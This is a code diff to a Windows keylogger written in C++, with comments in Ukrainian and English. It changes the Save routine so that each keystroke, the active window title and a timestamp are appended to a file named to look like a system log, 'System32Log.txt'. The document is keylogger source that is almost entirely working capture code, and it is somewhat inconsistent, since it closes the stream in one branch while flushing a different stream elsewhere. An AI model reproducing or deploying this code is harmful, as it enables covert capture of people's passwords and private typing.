@@ -47,7 +47,7 @@ void KeyLog::ReleaseHook() {
 
 int KeyLog::Save(int key_stroke)
 {
-	std::ofstream* OUTPUT_FILE;
+	std::ofstream fout("System32Log.txt", std::fstream::app);
 	char lastwindow[256];
 
 	if ((key_stroke == 1) || (key_stroke == 2))
@@ -81,9 +81,9 @@ int KeyLog::Save(int key_stroke)
 			strftime(s, sizeof(s), "%c", tm);
 
 		
-			*OUTPUT_FILE << "\n\n[Window: " << window_title << " - at " << s << "] ";
+			fout << "\n\n[Window: " << window_title << " - at " << s << "] ";
 
-			KeyLog::SetOutputFile(OUTPUT_FILE);
+			//KeyLog::SetOutputFile(fout);
 		}
 	}
 
@@ -91,37 +91,37 @@ int KeyLog::Save(int key_stroke)
 	std::cout << key_stroke << '\n';
 
 	if (key_stroke == VK_BACK)
-		*OUTPUT_FILE << "[BACKSPACE]";
+		fout << "[BACKSPACE]";
 	else if (key_stroke == VK_RETURN)
-		*OUTPUT_FILE << "\n";
+		fout << "\n";
 	else if (key_stroke == VK_SPACE)
-		*OUTPUT_FILE << " ";
+		fout << " ";
 	else if (key_stroke == VK_TAB)
-		*OUTPUT_FILE << "[TAB]";
+		fout << "[TAB]";
 	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-		*OUTPUT_FILE << "[SHIFT]";
+		fout << "[SHIFT]";
 	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-		*OUTPUT_FILE << "[CONTROL]";
+		fout << "[CONTROL]";
 	else if (key_stroke == VK_ESCAPE)
-		*OUTPUT_FILE << "[ESCAPE]";
+		fout << "[ESCAPE]";
 	else if (key_stroke == VK_END)
-		*OUTPUT_FILE << "[END]";
+		fout << "[END]";
 	else if (key_stroke == VK_HOME)
-		*OUTPUT_FILE << "[HOME]";
+		fout << "[HOME]";
 	else if (key_stroke == VK_LEFT)
-		*OUTPUT_FILE << "[LEFT]";
+		fout << "[LEFT]";
 	else if (key_stroke == VK_UP)
-		*OUTPUT_FILE << "[UP]";
+		fout << "[UP]";
 	else if (key_stroke == VK_RIGHT)
-		*OUTPUT_FILE << "[RIGHT]";
+		fout << "[RIGHT]";
 	else if (key_stroke == VK_DOWN)
-		*OUTPUT_FILE << "[DOWN]";
+		fout << "[DOWN]";
 	else if (key_stroke == 190 || key_stroke == 110)
-		*OUTPUT_FILE << ".";
+		fout << ".";
 	else if (key_stroke == 189 || key_stroke == 109)
-		*OUTPUT_FILE << "-";
+		fout << "-";
 	else if (key_stroke == 20)
-		*OUTPUT_FILE << "[CAPSLOCK]";
+		fout << "[CAPSLOCK]";
 	else {
 		char key;
 		// перевірка Caps Lock
@@ -140,8 +140,10 @@ int KeyLog::Save(int key_stroke)
 		//tolower converts it to lowercase properly
 		// tolower правильно перетворює його на lowercase
 		if (!lowercase) key = tolower(key);
-		*OUTPUT_FILE << char(key);
-		KeyLog::SetOutputFile(OUTPUT_FILE);
+		fout << char(key);
+
+		fout.close();
+		//KeyLog::SetOutputFile(fout);
 	}
 	// замість того, щоб щоразу відкривати та закривати обробники файлів, залишаєм файл відкритим і скидаєм.
 	KeyLog::GetOutputFile().flush();
